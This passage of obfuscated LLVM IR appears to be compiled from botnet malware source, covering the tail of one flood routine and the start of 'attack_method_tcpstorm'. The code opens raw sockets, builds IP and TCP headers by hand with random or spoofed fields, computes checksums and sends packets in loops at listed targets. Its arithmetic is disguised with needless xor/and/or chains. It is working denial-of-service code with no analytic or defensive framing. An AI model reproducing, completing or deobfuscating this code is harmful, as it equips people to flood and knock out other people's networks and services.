  br i1 %567, label %568, label %577

; <label>:568:                                    ; preds = %564
  %569 = call i32 @rand_next()
  %570 = xor i32 65535, -1
  %571 = xor i32 %569, %570
  %572 = and i32 %571, %569
  %573 = and i32 %569, 65535
  %574 = trunc i32 %572 to i16
  %575 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %576 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %575, i32 0, i32 3
  store i16 %574, i16* %576, align 4
  br label %577

; <label>:577:                                    ; preds = %568, %564
  %578 = load i16, i16* %16, align 2
  %579 = zext i16 %578 to i32
  %580 = icmp eq i32 %579, 65535
  br i1 %580, label %581, label %594

; <label>:581:                                    ; preds = %577
  %582 = call i32 @rand_next()
  %583 = xor i32 %582, -1
  %584 = xor i32 65535, -1
  %585 = xor i32 1189589074, -1
  %586 = or i32 %583, %584
  %587 = or i32 1189589074, %585
  %588 = xor i32 %586, -1
  %589 = and i32 %588, %587
  %590 = and i32 %582, 65535
  %591 = trunc i32 %589 to i16
  %592 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %593 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %592, i32 0, i32 0
  store i16 %591, i16* %593, align 4
  br label %594

; <label>:594:                                    ; preds = %581, %577
  %595 = load i16, i16* %17, align 2
  %596 = zext i16 %595 to i32
  %597 = icmp eq i32 %596, 65535
  br i1 %597, label %598, label %607

; <label>:598:                                    ; preds = %594
  %599 = call i32 @rand_next()
  %600 = xor i32 65535, -1
  %601 = xor i32 %599, %600
  %602 = and i32 %601, %599
  %603 = and i32 %599, 65535
  %604 = trunc i32 %602 to i16
  %605 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %606 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %605, i32 0, i32 1
  store i16 %604, i16* %606, align 2
  br label %607

; <label>:607:                                    ; preds = %598, %594
  %608 = load i32, i32* %18, align 4
  %609 = icmp eq i32 %608, 65535
  br i1 %609, label %610, label %614

; <label>:610:                                    ; preds = %607
  %611 = call i32 @rand_next()
  %612 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %613 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %612, i32 0, i32 2
  store i32 %611, i32* %613, align 4
  br label %614

; <label>:614:                                    ; preds = %610, %607
  %615 = load i32, i32* %19, align 4
  %616 = icmp eq i32 %615, 65535
  br i1 %616, label %617, label %621

; <label>:617:                                    ; preds = %614
  %618 = call i32 @rand_next()
  %619 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %620 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %619, i32 0, i32 3
  store i32 %618, i32* %620, align 4
  br label %621

; <label>:621:                                    ; preds = %617, %614
  %622 = load i8, i8* %20, align 1
  %623 = icmp ne i8 %622, 0
  br i1 %623, label %624, label %633

; <label>:624:                                    ; preds = %621
  %625 = call i32 @rand_next()
  %626 = xor i32 65535, -1
  %627 = xor i32 %625, %626
  %628 = and i32 %627, %625
  %629 = and i32 %625, 65535
  %630 = trunc i32 %628 to i16
  %631 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %632 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %631, i32 0, i32 7
  store i16 %630, i16* %632, align 2
  br label %633

; <label>:633:                                    ; preds = %624, %621
  %634 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %635 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %634, i32 0, i32 7
  store i16 0, i16* %635, align 2
  %636 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %637 = bitcast %struct.iphdr* %636 to i16*
  %638 = call zeroext i16 @checksum_generic(i16* %637, i32 20)
  %639 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %640 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %639, i32 0, i32 7
  store i16 %638, i16* %640, align 2
  %641 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %642 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %641, i32 0, i32 6
  store i16 0, i16* %642, align 4
  %643 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %644 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %645 = bitcast %struct.tcphdr* %644 to i8*
  %646 = call zeroext i16 @htons(i16 zeroext 40) #7
  %647 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %643, i8* %645, i16 zeroext %646, i32 40)
  %648 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %649 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %648, i32 0, i32 6
  store i16 %647, i16* %649, align 4
  %650 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %651 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %650, i32 0, i32 1
  %652 = load i16, i16* %651, align 2
  %653 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %654 = load i32, i32* %9, align 4
  %655 = sext i32 %654 to i64
  %656 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %653, i64 %655
  %657 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %656, i32 0, i32 0
  %658 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %657, i32 0, i32 1
  store i16 %652, i16* %658, align 2
  %659 = load i32, i32* %10, align 4
  %660 = load i8*, i8** %30, align 8
  %661 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %662 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %663 = load i32, i32* %9, align 4
  %664 = sext i32 %663 to i64
  %665 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %662, i64 %664
  %666 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %665, i32 0, i32 0
  %667 = bitcast %struct.sockaddr_in* %666 to %struct.sockaddr*
  store %struct.sockaddr* %667, %struct.sockaddr** %661, align 8
  %668 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %669 = load %struct.sockaddr*, %struct.sockaddr** %668, align 8
  %670 = call i64 @sendto(i32 %659, i8* %660, i64 60, i32 16384, %struct.sockaddr* %669, i32 16)
  br label %671

; <label>:671:                                    ; preds = %633
  %672 = load i32, i32* %9, align 4
  %673 = sub i32 0, %672
  %674 = sub i32 0, 1
  %675 = add i32 %673, %674
  %676 = sub i32 0, %675
  %677 = add nsw i32 %672, 1
  store i32 %676, i32* %9, align 4
  br label %508

; <label>:678:                                    ; preds = %508
  br label %507

; <label>:679:                                    ; preds = %104, %98
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpstorm(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.tcphdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %37 = load i8, i8* %5, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 %38, i64 8) #6
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %11, align 8
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 2, i32 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %12, align 1
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 3, i32 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %13, align 2
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 4, i32 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %14, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 5, i32 0)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %15, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 6, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %16, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 7, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %17, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 17, i32 65535)
  store i32 %67, i32* %18, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 18, i32 65535)
  store i32 %70, i32* %19, align 4
  %71 = load i8, i8* %7, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 11, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %20, align 1
  %75 = load i8, i8* %7, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 12, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 13, i32 1)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %7, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 14, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %23, align 1
  %87 = load i8, i8* %7, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 15, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %24, align 1
  %91 = load i8, i8* %7, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 16, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %25, align 1
  %95 = load i8, i8* %7, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 0, i32 1458)
  store i32 %97, i32* %26, align 4
  %98 = load i8, i8* %7, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %100 = call i32 @attack_get_opt_int(i8 zeroext %98, %struct.attack_option* %99, i8 zeroext 1, i32 1)
  %101 = trunc i32 %100 to i8
  store i8 %101, i8* %27, align 1
  %102 = load i8, i8* %7, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %104 = load i32, i32* @LOCAL_ADDR, align 4
  %105 = call i32 @attack_get_opt_ip(i8 zeroext %102, %struct.attack_option* %103, i8 zeroext 25, i32 %104)
  store i32 %105, i32* %28, align 4
  %106 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %106, i32* %10, align 4
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %108, label %109

; <label>:108:                                    ; preds = %4
  br label %611

; <label>:109:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %110 = load i32, i32* %10, align 4
  %111 = bitcast i32* %9 to i8*
  %112 = call i32 @setsockopt(i32 %110, i32 0, i32 3, i8* %111, i32 4) #6
  %113 = icmp eq i32 %112, -1
  br i1 %113, label %114, label %117

; <label>:114:                                    ; preds = %109
  %115 = load i32, i32* %10, align 4
  %116 = call i32 @close(i32 %115)
  br label %611

; <label>:117:                                    ; preds = %109
  store i32 0, i32* %9, align 4
  br label %118

; <label>:118:                                    ; preds = %418, %117
  %119 = load i32, i32* %9, align 4
  %120 = load i8, i8* %5, align 1
  %121 = zext i8 %120 to i32
  %122 = icmp slt i32 %119, %121
  br i1 %122, label %123, label %423

; <label>:123:                                    ; preds = %118
  store i8* getelementptr inbounds ([125 x i8], [125 x i8]* @.str.257, i32 0, i32 0), i8** %31, align 8
  %124 = call noalias i8* @calloc(i64 1458, i64 1) #6
  %125 = load i8**, i8*** %11, align 8
  %126 = load i32, i32* %9, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds i8*, i8** %125, i64 %127
  store i8* %124, i8** %128, align 8
  %129 = load i8**, i8*** %11, align 8
  %130 = load i32, i32* %9, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds i8*, i8** %129, i64 %131
  %133 = load i8*, i8** %132, align 8
  %134 = bitcast i8* %133 to %struct.iphdr*
  store %struct.iphdr* %134, %struct.iphdr** %29, align 8
  %135 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i64 1
  %137 = bitcast %struct.iphdr* %136 to %struct.tcphdr*
  store %struct.tcphdr* %137, %struct.tcphdr** %30, align 8
  %138 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %139 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %138, i64 124
  %140 = bitcast %struct.tcphdr* %139 to i8*
  store i8* %140, i8** %31, align 8
  %141 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %142 = bitcast %struct.iphdr* %141 to i8*
  %143 = load i8, i8* %142, align 4
  %144 = xor i8 %143, -1
  %145 = xor i8 15, -1
  %146 = xor i8 -62, -1
  %147 = or i8 %144, %145
  %148 = or i8 -62, %146
  %149 = xor i8 %147, -1
  %150 = and i8 %149, %148
  %151 = and i8 %143, 15
  %152 = xor i8 %150, -1
  %153 = xor i8 64, -1
  %154 = xor i8 92, -1
  %155 = and i8 %152, 92
  %156 = and i8 %150, %154
  %157 = and i8 %153, 92
  %158 = and i8 64, %154
  %159 = or i8 %155, %156
  %160 = or i8 %157, %158
  %161 = xor i8 %159, %160
  %162 = or i8 %152, %153
  %163 = xor i8 %162, -1
  %164 = or i8 92, %154
  %165 = and i8 %163, %164
  %166 = or i8 %161, %165
  %167 = or i8 %150, 64
  store i8 %166, i8* %142, align 4
  %168 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %169 = bitcast %struct.iphdr* %168 to i8*
  %170 = load i8, i8* %169, align 4
  %171 = xor i8 %170, -1
  %172 = xor i8 -16, -1
  %173 = xor i8 103, -1
  %174 = or i8 %171, %172
  %175 = or i8 103, %173
  %176 = xor i8 %174, -1
  %177 = and i8 %176, %175
  %178 = and i8 %170, -16
  %179 = and i8 %177, 5
  %180 = xor i8 %177, 5
  %181 = or i8 %179, %180
  %182 = or i8 %177, 5
  store i8 %181, i8* %169, align 4
  %183 = load i8, i8* %12, align 1
  %184 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i32 0, i32 1
  store i8 %183, i8* %185, align 1
  %186 = load i32, i32* %26, align 4
  %187 = sext i32 %186 to i64
  %188 = sub i64 0, 40
  %189 = sub i64 0, %187
  %190 = add i64 %188, %189
  %191 = sub i64 0, %190
  %192 = add i64 40, %187
  %193 = trunc i64 %191 to i16
  %194 = call zeroext i16 @htons(i16 zeroext %193) #7
  %195 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %196 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %195, i32 0, i32 2
  store i16 %194, i16* %196, align 2
  %197 = load i16, i16* %13, align 2
  %198 = call zeroext i16 @htons(i16 zeroext %197) #7
  %199 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %200 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %199, i32 0, i32 3
  store i16 %198, i16* %200, align 4
  %201 = load i8, i8* %14, align 1
  %202 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %203 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %202, i32 0, i32 5
  store i8 %201, i8* %203, align 4
  %204 = load i8, i8* %15, align 1
  %205 = icmp ne i8 %204, 0
  br i1 %205, label %206, label %210

; <label>:206:                                    ; preds = %123
  %207 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %208 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %209 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %208, i32 0, i32 4
  store i16 %207, i16* %209, align 2
  br label %210

; <label>:210:                                    ; preds = %206, %123
  %211 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %212 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %211, i32 0, i32 6
  store i8 6, i8* %212, align 1
  %213 = load i32, i32* %28, align 4
  %214 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 8
  store i32 %213, i32* %215, align 4
  %216 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %217 = load i32, i32* %9, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %216, i64 %218
  %220 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %219, i32 0, i32 1
  %221 = load i32, i32* %220, align 4
  %222 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %223 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %222, i32 0, i32 9
  store i32 %221, i32* %223, align 4
  %224 = load i16, i16* %16, align 2
  %225 = call zeroext i16 @htons(i16 zeroext %224) #7
  %226 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %227 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %226, i32 0, i32 0
  store i16 %225, i16* %227, align 4
  %228 = load i16, i16* %17, align 2
  %229 = call zeroext i16 @htons(i16 zeroext %228) #7
  %230 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %231 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %230, i32 0, i32 1
  store i16 %229, i16* %231, align 2
  %232 = load i32, i32* %18, align 4
  %233 = trunc i32 %232 to i16
  %234 = call zeroext i16 @htons(i16 zeroext %233) #7
  %235 = zext i16 %234 to i32
  %236 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 2
  store i32 %235, i32* %237, align 4
  %238 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %239 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %238, i32 0, i32 4
  %240 = load i16, i16* %239, align 4
  %241 = xor i16 %240, -1
  %242 = xor i16 -241, -1
  %243 = xor i16 -9692, -1
  %244 = or i16 %241, %242
  %245 = or i16 -9692, %243
  %246 = xor i16 %244, -1
  %247 = and i16 %246, %245
  %248 = and i16 %240, -241
  %249 = and i16 %247, 160
  %250 = xor i16 %247, 160
  %251 = or i16 %249, %250
  %252 = or i16 %247, 160
  store i16 %251, i16* %239, align 4
  %253 = load i8, i8* %20, align 1
  %254 = sext i8 %253 to i16
  %255 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %256 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %255, i32 0, i32 4
  %257 = load i16, i16* %256, align 4
  %258 = xor i16 %254, -1
  %259 = xor i16 1, -1
  %260 = xor i16 16732, -1
  %261 = or i16 %258, %259
  %262 = or i16 16732, %260
  %263 = xor i16 %261, -1
  %264 = and i16 %263, %262
  %265 = and i16 %254, 1
  %266 = shl i16 %264, 13
  %267 = xor i16 %257, -1
  %268 = xor i16 -8193, -1
  %269 = xor i16 3616, -1
  %270 = or i16 %267, %268
  %271 = or i16 3616, %269
  %272 = xor i16 %270, -1
  %273 = and i16 %272, %271
  %274 = and i16 %257, -8193
  %275 = and i16 %273, %266
  %276 = xor i16 %273, %266
  %277 = or i16 %275, %276
  %278 = or i16 %273, %266
  store i16 %277, i16* %256, align 4
  %279 = load i8, i8* %21, align 1
  %280 = sext i8 %279 to i16
  %281 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %282 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %281, i32 0, i32 4
  %283 = load i16, i16* %282, align 4
  %284 = xor i16 1, -1
  %285 = xor i16 %280, %284
  %286 = and i16 %285, %280
  %287 = and i16 %280, 1
  %288 = shl i16 %286, 12
  %289 = xor i16 -4097, -1
  %290 = xor i16 %283, %289
  %291 = and i16 %290, %283
  %292 = and i16 %283, -4097
  %293 = xor i16 %291, -1
  %294 = xor i16 %288, -1
  %295 = xor i16 -25707, -1
  %296 = and i16 %293, -25707
  %297 = and i16 %291, %295
  %298 = and i16 %294, -25707
  %299 = and i16 %288, %295
  %300 = or i16 %296, %297
  %301 = or i16 %298, %299
  %302 = xor i16 %300, %301
  %303 = or i16 %293, %294
  %304 = xor i16 %303, -1
  %305 = or i16 -25707, %295
  %306 = and i16 %304, %305
  %307 = or i16 %302, %306
  %308 = or i16 %291, %288
  store i16 %307, i16* %282, align 4
  %309 = load i8, i8* %22, align 1
  %310 = sext i8 %309 to i16
  %311 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %312 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %311, i32 0, i32 4
  %313 = load i16, i16* %312, align 4
  %314 = xor i16 %310, -1
  %315 = xor i16 1, -1
  %316 = xor i16 -12390, -1
  %317 = or i16 %314, %315
  %318 = or i16 -12390, %316
  %319 = xor i16 %317, -1
  %320 = and i16 %319, %318
  %321 = and i16 %310, 1
  %322 = shl i16 %320, 11
  %323 = xor i16 -2049, -1
  %324 = xor i16 %313, %323
  %325 = and i16 %324, %313
  %326 = and i16 %313, -2049
  %327 = and i16 %325, %322
  %328 = xor i16 %325, %322
  %329 = or i16 %327, %328
  %330 = or i16 %325, %322
  store i16 %329, i16* %312, align 4
  %331 = load i8, i8* %23, align 1
  %332 = sext i8 %331 to i16
  %333 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %334 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %333, i32 0, i32 4
  %335 = load i16, i16* %334, align 4
  %336 = xor i16 %332, -1
  %337 = xor i16 1, -1
  %338 = xor i16 10630, -1
  %339 = or i16 %336, %337
  %340 = or i16 10630, %338
  %341 = xor i16 %339, -1
  %342 = and i16 %341, %340
  %343 = and i16 %332, 1
  %344 = shl i16 %342, 10
  %345 = xor i16 -1025, -1
  %346 = xor i16 %335, %345
  %347 = and i16 %346, %335
  %348 = and i16 %335, -1025
  %349 = xor i16 %347, -1
  %350 = xor i16 %344, -1
  %351 = xor i16 26805, -1
  %352 = and i16 %349, 26805
  %353 = and i16 %347, %351
  %354 = and i16 %350, 26805
  %355 = and i16 %344, %351
  %356 = or i16 %352, %353
  %357 = or i16 %354, %355
  %358 = xor i16 %356, %357
  %359 = or i16 %349, %350
  %360 = xor i16 %359, -1
  %361 = or i16 26805, %351
  %362 = and i16 %360, %361
  %363 = or i16 %358, %362
  %364 = or i16 %347, %344
  store i16 %363, i16* %334, align 4
  %365 = load i8, i8* %24, align 1
  %366 = sext i8 %365 to i16
  %367 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %368 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %367, i32 0, i32 4
  %369 = load i16, i16* %368, align 4
  %370 = xor i16 1, -1
  %371 = xor i16 %366, %370
  %372 = and i16 %371, %366
  %373 = and i16 %366, 1
  %374 = shl i16 %372, 9
  %375 = xor i16 -513, -1
  %376 = xor i16 %369, %375
  %377 = and i16 %376, %369
  %378 = and i16 %369, -513
  %379 = xor i16 %377, -1
  %380 = xor i16 %374, -1
  %381 = xor i16 64, -1
  %382 = and i16 %379, 64
  %383 = and i16 %377, %381
  %384 = and i16 %380, 64
  %385 = and i16 %374, %381
  %386 = or i16 %382, %383
  %387 = or i16 %384, %385
  %388 = xor i16 %386, %387
  %389 = or i16 %379, %380
  %390 = xor i16 %389, -1
  %391 = or i16 64, %381
  %392 = and i16 %390, %391
  %393 = or i16 %388, %392
  %394 = or i16 %377, %374
  store i16 %393, i16* %368, align 4
  %395 = load i8, i8* %25, align 1
  %396 = sext i8 %395 to i16
  %397 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %398 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %397, i32 0, i32 4
  %399 = load i16, i16* %398, align 4
  %400 = xor i16 1, -1
  %401 = xor i16 %396, %400
  %402 = and i16 %401, %396
  %403 = and i16 %396, 1
  %404 = shl i16 %402, 8
  %405 = xor i16 -257, -1
  %406 = xor i16 %399, %405
  %407 = and i16 %406, %399
  %408 = and i16 %399, -257
  %409 = and i16 %407, %404
  %410 = xor i16 %407, %404
  %411 = or i16 %409, %410
  %412 = or i16 %407, %404
  store i16 %411, i16* %398, align 4
  %413 = call i32 @rand() #6
  %414 = srem i32 %413, 65535
  %415 = trunc i32 %414 to i16
  %416 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %417 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %416, i32 0, i32 5
  store i16 %415, i16* %417, align 2
  br label %418

; <label>:418:                                    ; preds = %210
  %419 = load i32, i32* %9, align 4
  %420 = sub i32 0, 1
  %421 = sub i32 %419, %420
  %422 = add nsw i32 %419, 1
  store i32 %421, i32* %9, align 4
  br label %118

; <label>:423:                                    ; preds = %118
  br label %424

; <label>:424:                                    ; preds = %610, %423
  store i32 0, i32* %9, align 4
  br label %425

; <label>:425:                                    ; preds = %605, %424
  %426 = load i32, i32* %9, align 4
  %427 = load i8, i8* %5, align 1
  %428 = zext i8 %427 to i32
  %429 = icmp slt i32 %426, %428
  br i1 %429, label %430, label %610

; <label>:430:                                    ; preds = %425
  %431 = load i8**, i8*** %11, align 8
  %432 = load i32, i32* %9, align 4
  %433 = sext i32 %432 to i64
  %434 = getelementptr inbounds i8*, i8** %431, i64 %433
  %435 = load i8*, i8** %434, align 8
  store i8* %435, i8** %32, align 8
  %436 = load i8*, i8** %32, align 8
  %437 = bitcast i8* %436 to %struct.iphdr*
  store %struct.iphdr* %437, %struct.iphdr** %33, align 8
  %438 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %439 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %438, i64 1
  %440 = bitcast %struct.iphdr* %439 to %struct.tcphdr*
  store %struct.tcphdr* %440, %struct.tcphdr** %34, align 8
  %441 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %442 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %441, i64 1
  %443 = bitcast %struct.tcphdr* %442 to i8*
  store i8* %443, i8** %35, align 8
  %444 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %445 = load i32, i32* %9, align 4
  %446 = sext i32 %445 to i64
  %447 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %444, i64 %446
  %448 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %447, i32 0, i32 2
  %449 = load i8, i8* %448, align 4
  %450 = zext i8 %449 to i32
  %451 = icmp slt i32 %450, 32
  br i1 %451, label %452, label %476

; <label>:452:                                    ; preds = %430
  %453 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %454 = load i32, i32* %9, align 4
  %455 = sext i32 %454 to i64
  %456 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %453, i64 %455
  %457 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %456, i32 0, i32 1
  %458 = load i32, i32* %457, align 4
  %459 = call i32 @ntohl(i32 %458) #7
  %460 = call i32 @rand_next()
  %461 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %462 = load i32, i32* %9, align 4
  %463 = sext i32 %462 to i64
  %464 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %461, i64 %463
  %465 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %464, i32 0, i32 2
